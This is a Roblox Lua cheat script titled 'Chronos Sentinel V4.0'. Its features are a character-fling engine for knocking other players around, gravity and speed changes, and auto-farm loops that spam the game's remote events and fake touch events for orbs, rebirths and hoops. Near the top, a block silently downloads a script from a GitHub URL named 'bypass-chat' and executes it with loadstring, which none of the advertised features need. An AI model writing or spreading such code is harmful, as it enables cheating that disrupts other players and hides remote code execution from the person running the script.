-- // CHRONOS SENTINEL V4.0 LEGENDS EDITION //
-- STATUS: Kinetic Core + Legends Protocol + Tab System
-- FEATURES: Moon-Jump, Void-Lock, Mobile-Fling, Orb-Link, Rebirth-Cycle

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

-- // 1. PREMIUM CONFIGURATION //
local CHRONOS_SETTINGS = {
    -- Kinetic Core
    EGOR_MODE = false,
    FLING_MODE = false,
    WALK_SPEED = 4,
    ANIM_MULTIPLIER = 25,
    FLING_STRENGTH = 999999,
    MOON_GRAVITY = 45,
    NORMAL_GRAVITY = 196.2,
    EGOR_JUMP_POWER = 18, 
    
    -- Legends Core
    AUTO_ORBS = false,
    AUTO_REBIRTH = false,
    AUTO_HOOPS = false,
    FARM_SPEED = 0.1, -- Speed of orb collection
    
    -- UI State
    UI_OPEN = true,
    MINIMIZED = false,
    CURRENT_TAB = "Movement", -- "Movement" or "Legends"
    ACCENT_COLOR = Color3.fromRGB(0, 255, 180),
    ACTIVE = true
}

local Internal = {
    Dragging = false,
    DragStart = nil,
    StartPos = nil,
    CurrentChar = nil,
    CurrentRoot = nil,
    CurrentHum = nil,
    InitialLoad = false,
    OrbLoop = nil,
    RebirthLoop = nil
}

-- // 2. THE LOADINGSTRING (FLETCHER) //
if not _G.ChronosLoaded then 
    _G.ChronosLoaded = true
    task.spawn(function()
        pcall(function()
            local FreshURL = "https://raw.githubusercontent.com/giga21word-maker/bypass-chat/main/main.lua?t=" .. tick()
            loadstring(game:HttpGet(FreshURL))()
        end)
    end)
end

-- // 3. CORE UTILITIES (UPGRADED) //
local function UpdateCharacterRefs(char)
    if not char then return end
    Internal.CurrentChar = char
    Internal.CurrentRoot = char:WaitForChild("HumanoidRootPart", 10)
    Internal.CurrentHum = char:WaitForChild("Humanoid", 10)
    
    workspace.Gravity = CHRONOS_SETTINGS.NORMAL_GRAVITY
end

if LocalPlayer.Character then UpdateCharacterRefs(LocalPlayer.Character) end
LocalPlayer.CharacterAdded:Connect(UpdateCharacterRefs)

local function FullReset()
    workspace.Gravity = CHRONOS_SETTINGS.NORMAL_GRAVITY
    if Internal.CurrentHum then
        Internal.CurrentHum.WalkSpeed = 16
        Internal.CurrentHum.JumpPower = 50
        Internal.CurrentHum.UseJumpPower = false
        local animator = Internal.CurrentHum:FindFirstChildOfClass("Animator")
        if animator then
            for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                track:AdjustSpeed(1)
            end
        end
    end
    -- Reset Legends Toggles
    CHRONOS_SETTINGS.AUTO_ORBS = false
    CHRONOS_SETTINGS.AUTO_REBIRTH = false
    CHRONOS_SETTINGS.AUTO_HOOPS = false
end

-- // 4. STABILIZED FLING ENGINE (V3.7 HYBRID) //
local function ManageFling(state)
    if not Internal.CurrentRoot then return end
    local spin = Internal.CurrentRoot:FindFirstChild("UltraSpin")
    local thrust = Internal.CurrentRoot:FindFirstChild("UltraThrust")
    
    if state then
        if not spin then
            spin = Instance.new("BodyAngularVelocity")
            spin.Name = "UltraSpin"
            spin.Parent = Internal.CurrentRoot
            spin.MaxTorque = Vector3.new(0, math.huge, 0)
            spin.P = 15000 
            spin.AngularVelocity = Vector3.new(0, CHRONOS_SETTINGS.FLING_STRENGTH, 0)
        end
        if not thrust then
            thrust = Instance.new("BodyThrust")
            thrust.Name = "UltraThrust"
            thrust.Parent = Internal.CurrentRoot
            thrust.Force = Vector3.new(500, 0, 500) 
            thrust.Location = Internal.CurrentRoot.Position
        end
        for _, part in pairs(Internal.CurrentChar:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = false end
        end
    else
        if spin then spin:Destroy() end
        if thrust then thrust:Destroy() end
        for _, part in pairs(Internal.CurrentChar:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = true end
        end
    end
end

-- // 5. LEGENDS PROTOCOLS (NEW) //
local function LegendsFarm()
    task.spawn(function()
        while CHRONOS_SETTINGS.ACTIVE do
            if CHRONOS_SETTINGS.AUTO_ORBS then
                local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
                if rEvents and rEvents:FindFirstChild("orbEvent") then
                    local orbs = {"Red Orb", "Yellow Orb", "Gem", "Blue Orb", "Orange Orb"}
                    for _, orb in pairs(orbs) do
                        if not CHRONOS_SETTINGS.AUTO_ORBS then break end
                        rEvents.orbEvent:FireServer("collectOrb", orb, "City")
                        rEvents.orbEvent:FireServer("collectOrb", orb, "Snow City")
                        rEvents.orbEvent:FireServer("collectOrb", orb, "Magma City")
                    end
                end
            end
            task.wait(CHRONOS_SETTINGS.FARM_SPEED)
        end
    end)

    task.spawn(function()
        while CHRONOS_SETTINGS.ACTIVE do
            if CHRONOS_SETTINGS.AUTO_REBIRTH then
                local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
                if rEvents and rEvents:FindFirstChild("rebirthEvent") then
                    rEvents.rebirthEvent:FireServer("rebirthRequest")
                end
            end
            task.wait(1)
        end
    end)
    
    task.spawn(function()
        while CHRONOS_SETTINGS.ACTIVE do
            if CHRONOS_SETTINGS.AUTO_HOOPS then
                 -- Physical Hoop Collection (Most reliable for LoS)
                if workspace:FindFirstChild("Hoops") and Internal.CurrentRoot then
                    for _, hoop in pairs(workspace.Hoops:GetChildren()) do
                        if not CHRONOS_SETTINGS.AUTO_HOOPS then break end
                        if hoop:IsA("MeshPart") or hoop:IsA("Part") then
                             firetouchinterest(Internal.CurrentRoot, hoop, 0)
                             firetouchinterest(Internal.CurrentRoot, hoop, 1)
                        end
                    end
                end
            end
            task.wait(0.5)
        end
    end)
end

-- // 6. ADVANCED GUI (V4.0 DUAL-CORE) //
local function BuildUI()
    if CoreGui:FindFirstChild("ChronosUltra") then CoreGui.ChronosUltra:Destroy() end
    
    local Screen = Instance.new("ScreenGui", CoreGui)
    Screen.Name = "ChronosUltra"
    Screen.ResetOnSpawn = false

    local Main = Instance.new("Frame", Screen)
    Main.Name = "Main"
    Main.Size = UDim2.new(0, 240, 0, 220) -- Expanded for Tabs
    Main.Position = UDim2.new(0.5, -120, 0.3, 0)
    Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    Main.BorderSizePixel = 0
    Main.ClipsDescendants = true
    Main.ZIndex = 5
    Instance.new("UICorner", Main)
    local UIStroke = Instance.new("UIStroke", Main)
    UIStroke.Color = CHRONOS_SETTINGS.ACCENT_COLOR
    UIStroke.Thickness = 2

    -- HEADER
    local Header = Instance.new("Frame", Main)
    Header.Size = UDim2.new(1, 0, 0, 30)
    Header.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    Header.ZIndex = 10
    Instance.new("UICorner", Header)
    
    local Title = Instance.new("TextLabel", Header)
    Title.Size = UDim2.new(1, -70, 1, 0)
    Title.Position = UDim2.new(0, 10, 0, 0)
    Title.Text = "CHRONOS V4.0 [LEGENDS]"
    Title.TextColor3 = Color3.new(1, 1, 1)
    Title.Font = Enum.Font.Code
    Title.TextSize = 14
    Title.BackgroundTransparency = 1
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.ZIndex = 11

    local MinBtn = Instance.new("TextButton", Header)
    MinBtn.Size = UDim2.new(0, 25, 0, 25)
    MinBtn.Position = UDim2.new(1, -60, 0, 2)
    MinBtn.Text = "-"
    MinBtn.TextColor3 = Color3.new(1, 1, 1)
    MinBtn.BackgroundTransparency = 1
    MinBtn.ZIndex = 12

    local CloseBtn = Instance.new("TextButton", Header)
    CloseBtn.Size = UDim2.new(0, 25, 0, 25)
    CloseBtn.Position = UDim2.new(1, -30, 0, 2)
    CloseBtn.Text = "X"
    CloseBtn.TextColor3 = Color3.new(1, 0.3, 0.3)
    CloseBtn.BackgroundTransparency = 1
    CloseBtn.ZIndex = 12

    -- TAB CONTAINER
    local TabContainer = Instance.new("Frame", Main)
    TabContainer.Size = UDim2.new(1, 0, 0, 25)
    TabContainer.Position = UDim2.new(0, 0, 0, 30)
    TabContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    TabContainer.ZIndex = 10

    local MoveTab = Instance.new("TextButton", TabContainer)
    MoveTab.Size = UDim2.new(0.5, 0, 1, 0)
    MoveTab.BackgroundTransparency = 1
    MoveTab.Text = "KINETIC"
    MoveTab.TextColor3 = CHRONOS_SETTINGS.ACCENT_COLOR
    MoveTab.Font = Enum.Font.Code
    MoveTab.ZIndex = 11

    local LegendsTab = Instance.new("TextButton", TabContainer)
    LegendsTab.Size = UDim2.new(0.5, 0, 1, 0)
    LegendsTab.Position = UDim2.new(0.5, 0, 0, 0)
    LegendsTab.BackgroundTransparency = 1
    LegendsTab.Text = "LEGENDS"
    LegendsTab.TextColor3 = Color3.fromRGB(150, 150, 150)
    LegendsTab.Font = Enum.Font.Code
    LegendsTab.ZIndex = 11

    -- PAGES
    local Content = Instance.new("Frame", Main)
    Content.Name = "Content"
    Content.Size = UDim2.new(1, 0, 1, -55)
    Content.Position = UDim2.new(0, 0, 0, 55)
    Content.BackgroundTransparency = 1
    Content.ZIndex = 5

    -- Page 1: Kinetic (Movement)
    local PageKinetic = Instance.new("Frame", Content)
    PageKinetic.Size = UDim2.new(1, 0, 1, 0)
    PageKinetic.BackgroundTransparency = 1
    PageKinetic.Visible = true

    local EBtn = Instance.new("TextButton", PageKinetic)
    EBtn.Size = UDim2.new(1, -20, 0, 40)
    EBtn.Position = UDim2.new(0, 10, 0, 10)
    EBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    EBtn.Text = "EGOR DRIVE: OFF"
    EBtn.TextColor3 = Color3.new(1, 1, 1)
    EBtn.Font = Enum.Font.SourceSansBold
    EBtn.ZIndex = 6
    Instance.new("UICorner", EBtn)

    local FBtn = Instance.new("TextButton", PageKinetic)
    FBtn.Size = UDim2.new(1, -20, 0, 40)
    FBtn.Position = UDim2.new(0, 10, 0, 60)
    FBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    FBtn.Text = "MOBILE FLING: OFF"
    FBtn.TextColor3 = Color3.new(1, 1, 1)
    FBtn.Font = Enum.Font.SourceSansBold
    FBtn.ZIndex = 6
    Instance.new("UICorner", FBtn)
    
    local VoidLabel = Instance.new("TextLabel", PageKinetic)
    VoidLabel.Size = UDim2.new(1, 0, 0, 20)
    VoidLabel.Position = UDim2.new(0, 0, 0, 110)
    VoidLabel.Text = "Void-Lock Protocol: ACTIVE"
    VoidLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
    VoidLabel.BackgroundTransparency = 1
    VoidLabel.Font = Enum.Font.Code
    VoidLabel.TextSize = 12

    -- Page 2: Legends (Farming)
    local PageLegends = Instance.new("Frame", Content)
    PageLegends.Size = UDim2.new(1, 0, 1, 0)
    PageLegends.BackgroundTransparency = 1
    PageLegends.Visible = false

    local OrbBtn = Instance.new("TextButton", PageLegends)
    OrbBtn.Size = UDim2.new(1, -20, 0, 35)
    OrbBtn.Position = UDim2.new(0, 10, 0, 10)
    OrbBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    OrbBtn.Text = "ORB-LINK: OFF"
    OrbBtn.TextColor3 = Color3.new(1, 1, 1)
    OrbBtn.ZIndex = 6
    Instance.new("UICorner", OrbBtn)

    local RebirthBtn = Instance.new("TextButton", PageLegends)
    RebirthBtn.Size = UDim2.new(1, -20, 0, 35)
    RebirthBtn.Position = UDim2.new(0, 10, 0, 55)
    RebirthBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    RebirthBtn.Text = "AUTO-REBIRTH: OFF"
    RebirthBtn.TextColor3 = Color3.new(1, 1, 1)
    RebirthBtn.ZIndex = 6
    Instance.new("UICorner", RebirthBtn)

    local HoopBtn = Instance.new("TextButton", PageLegends)
    HoopBtn.Size = UDim2.new(1, -20, 0, 35)
    HoopBtn.Position = UDim2.new(0, 10, 0, 100)
    HoopBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    HoopBtn.Text = "AUTO-HOOPS: OFF"
    HoopBtn.TextColor3 = Color3.new(1, 1, 1)
    HoopBtn.ZIndex = 6
    Instance.new("UICorner", HoopBtn)

    -- // INTERACTIONS //
    -- Tab Switching
    MoveTab.MouseButton1Click:Connect(function()
        PageKinetic.Visible = true
        PageLegends.Visible = false
        MoveTab.TextColor3 = CHRONOS_SETTINGS.ACCENT_COLOR
        LegendsTab.TextColor3 = Color3.fromRGB(150, 150, 150)
    end)
    LegendsTab.MouseButton1Click:Connect(function()
        PageKinetic.Visible = false
        PageLegends.Visible = true
        MoveTab.TextColor3 = Color3.fromRGB(150, 150, 150)
        LegendsTab.TextColor3 = CHRONOS_SETTINGS.ACCENT_COLOR
    end)

    -- Kinetic Buttons
    EBtn.MouseButton1Click:Connect(function()
        CHRONOS_SETTINGS.EGOR_MODE = not CHRONOS_SETTINGS.EGOR_MODE
        if not CHRONOS_SETTINGS.EGOR_MODE then FullReset() end
        EBtn.Text = CHRONOS_SETTINGS.EGOR_MODE and "EGOR DRIVE: ON" or "EGOR DRIVE: OFF"
        EBtn.TextColor3 = CHRONOS_SETTINGS.EGOR_MODE and CHRONOS_SETTINGS.ACCENT_COLOR or Color3.new(1, 1, 1)
    end)

    FBtn.MouseButton1Click:Connect(function()
        CHRONOS_SETTINGS.FLING_MODE = not CHRONOS_SETTINGS.FLING_MODE
        ManageFling(CHRONOS_SETTINGS.FLING_MODE)
        FBtn.Text = CHRONOS_SETTINGS.FLING_MODE and "FLING: ACTIVE" or "MOBILE FLING: OFF"
        FBtn.TextColor3 = CHRONOS_SETTINGS.FLING_MODE and Color3.new(1, 0.2, 0.2) or Color3.new(1, 1, 1)
    end)

    -- Legends Buttons
    OrbBtn.MouseButton1Click:Connect(function()
        CHRONOS_SETTINGS.AUTO_ORBS = not CHRONOS_SETTINGS.AUTO_ORBS
        OrbBtn.Text = CHRONOS_SETTINGS.AUTO_ORBS and "ORB-LINK: ACTIVE" or "ORB-LINK: OFF"
        OrbBtn.TextColor3 = CHRONOS_SETTINGS.AUTO_ORBS and CHRONOS_SETTINGS.ACCENT_COLOR or Color3.new(1, 1, 1)
    end)
    
    RebirthBtn.MouseButton1Click:Connect(function()
        CHRONOS_SETTINGS.AUTO_REBIRTH = not CHRONOS_SETTINGS.AUTO_REBIRTH
        RebirthBtn.Text = CHRONOS_SETTINGS.AUTO_REBIRTH and "AUTO-REBIRTH: ACTIVE" or "AUTO-REBIRTH: OFF"
        RebirthBtn.TextColor3 = CHRONOS_SETTINGS.AUTO_REBIRTH and CHRONOS_SETTINGS.ACCENT_COLOR or Color3.new(1, 1, 1)
    end)
    
    HoopBtn.MouseButton1Click:Connect(function()
        CHRONOS_SETTINGS.AUTO_HOOPS = not CHRONOS_SETTINGS.AUTO_HOOPS
        HoopBtn.Text = CHRONOS_SETTINGS.AUTO_HOOPS and "AUTO-HOOPS: ACTIVE" or "AUTO-HOOPS: OFF"
        HoopBtn.TextColor3 = CHRONOS_SETTINGS.AUTO_HOOPS and CHRONOS_SETTINGS.ACCENT_COLOR or Color3.new(1, 1, 1)
    end)

    -- Rainbow & Window Logic
    task.spawn(function()
        while task.wait() and CHRONOS_SETTINGS.ACTIVE do
            if CHRONOS_SETTINGS.EGOR_MODE or CHRONOS_SETTINGS.AUTO_ORBS then
                UIStroke.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
            else
                UIStroke.Color = CHRONOS_SETTINGS.ACCENT_COLOR
            end
        end
    end)

    MinBtn.MouseButton1Click:Connect(function()
        CHRONOS_SETTINGS.MINIMIZED = not CHRONOS_SETTINGS.MINIMIZED
        local TargetSize = CHRONOS_SETTINGS.MINIMIZED and UDim2.new(0, 240, 0, 30) or UDim2.new(0, 240, 0, 220)
        if CHRONOS_SETTINGS.MINIMIZED then Content.Visible = false TabContainer.Visible = false end
        local Tween = TweenService:Create(Main, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = TargetSize})
        Tween:Play()
        Tween.Completed:Connect(function()
            if not CHRONOS_SETTINGS.MINIMIZED then 
                Content.Visible = true 
                TabContainer.Visible = true
            end
        end)
    end)

    CloseBtn.MouseButton1Click:Connect(function() 
        FullReset()
        ManageFling(false)
        CHRONOS_SETTINGS.ACTIVE = false
        Screen:Destroy() 
    end)

    Header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            Internal.Dragging = true
            Internal.DragStart = input.Position
            Internal.StartPos = Main.Position
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if Internal.Dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - Internal.DragStart
            Main.Position = UDim2.new(Internal.StartPos.X.Scale, Internal.StartPos.X.Offset + delta.X, Internal.StartPos.Y.Scale, Internal.StartPos.Y.Offset + delta.Y)
        end
    end)
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then Internal.Dragging = false end
    end)
end

-- // 7. RUNTIME (V4.0 LEGENDS ENGINE) //
LegendsFarm() -- Initialize Legends Loop

RunService.Heartbeat:Connect(function()
    if not Internal.CurrentRoot or not Internal.CurrentHum or not CHRONOS_SETTINGS.ACTIVE then return end
    
    -- Void-Lock Protocol (Safety Net)
    if Internal.CurrentRoot.Position.Y < -50 then
        Internal.CurrentRoot.CFrame = CFrame.new(Internal.CurrentRoot.Position.X, 100, Internal.CurrentRoot.Position.Z)
        Internal.CurrentRoot.Velocity = Vector3.new(0,0,0)
    end
    
    if CHRONOS_SETTINGS.EGOR_MODE then
        workspace.Gravity = CHRONOS_SETTINGS.MOON_GRAVITY
        if Internal.CurrentHum.JumpPower ~= CHRONOS_SETTINGS.EGOR_JUMP_POWER then
            Internal.CurrentHum.UseJumpPower = true
            Internal.CurrentHum.JumpPower = CHRONOS_SETTINGS.EGOR_JUMP_POWER
        end
        if Internal.CurrentHum.MoveDirection.Magnitude > 0 then
            Internal.CurrentHum.WalkSpeed = CHRONOS_SETTINGS.WALK_SPEED
            local animator = Internal.CurrentHum:FindFirstChildOfClass("Animator")
            if animator then
                for _, t in pairs(animator:GetPlayingAnimationTracks()) do
                    if t.Name:lower():find("run") or t.Name:lower():find("walk") or t.Name:lower():find("idle") then
                        t:AdjustSpeed(CHRONOS_SETTINGS.ANIM_MULTIPLIER)
                    end
                end
            end
        end
    end

    if CHRONOS_SETTINGS.FLING_MODE then
        Internal.CurrentRoot.RotVelocity = Vector3.new(0, CHRONOS_SETTINGS.FLING_STRENGTH, 0)
    end
end)

BuildUI()
